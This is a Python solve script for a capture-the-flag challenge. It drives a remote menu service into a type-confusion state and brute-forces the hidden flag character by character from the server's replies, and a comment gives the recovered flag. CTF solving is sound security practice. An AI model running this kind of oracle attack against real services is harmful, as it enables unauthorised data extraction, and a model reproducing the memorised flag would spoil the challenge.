#very slow but working solution..
#can be improve by maintaining the connection and by use multithreads for the task.


import socket
import string


PORT =2222
URL = 'csa-2.csa-challenge.com'

#flag ='CSA{Typ3_C0nFu510n_iS_a_ReAL_Pr0bL3m}'
flag ='CSA{'
def try_letter(l):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as soc:
        soc.connect((URL,PORT))
        res= soc.recv(1024)
        #load flags
        soc.send(b'5\n')
        res= soc.recv(1024)
        soc.send(b'\n')
        res=soc.recv(1024)

        #change flag type to pasta
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'1\n')
        res=soc.recv(1024)
        soc.send(b'p\n')
        res=soc.recv(1024)

        #change coupon length to current size+1
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'4\n')
        res=soc.recv(1024)
        soc.send((str(len(flag)+1)+'\n').encode())
        res=soc.recv(1024)
        
        #change back to coupon
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'3\n')
        res=soc.recv(1024)
        soc.send(b'0\n')
        res=soc.recv(1024)
        soc.send(b'2\n')
        res=soc.recv(1024)
        soc.send(b'2\n')
        res=soc.recv(1024)
       
        #apply letter
        soc.send(b'5\n')
        res=soc.recv(1024)
        soc.send(f'{flag+l}\n'.encode())
        res= soc.recv(1024).decode()
        if 'Applied' in res:
            print(res)
            return True
        else:
            assert('Invalid' in res)
            return False
while len(flag)< 34:
    for c in string.ascii_letters+string.digits+string.punctuation:
        print(f"trying: {flag+c}")
        if try_letter(c):
            flag+=c
            print(flag)
            break